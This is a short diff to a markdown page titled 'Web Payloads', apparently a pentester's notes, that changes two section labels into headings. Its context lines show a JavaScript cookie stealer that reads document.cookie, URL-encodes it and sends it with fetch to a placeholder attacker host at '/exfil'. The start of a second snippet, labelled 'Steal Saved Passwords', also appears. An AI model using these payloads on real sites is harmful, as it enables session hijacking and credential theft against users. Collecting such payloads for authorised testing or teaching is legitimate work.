@@ -3,7 +3,7 @@ title: Web Payloads
 published: true
 ---
 
-Cookie Stealer:
+### [](#header-3)Cookie Stealer:
 
 ```js
 let cookie = document.cookie
@@ -13,7 +13,7 @@ let encodedCookie = encodeURIComponent(cookie)
 fetch("http://<LHOST-IP>/exfil?data=" + encodedCookie)
 ```
 
-Steal Saved Passwords:
+### [](#header-3)Steal Saved Passwords:
 
 ```js
 let body = document.getElementsByTagName("body")[0]
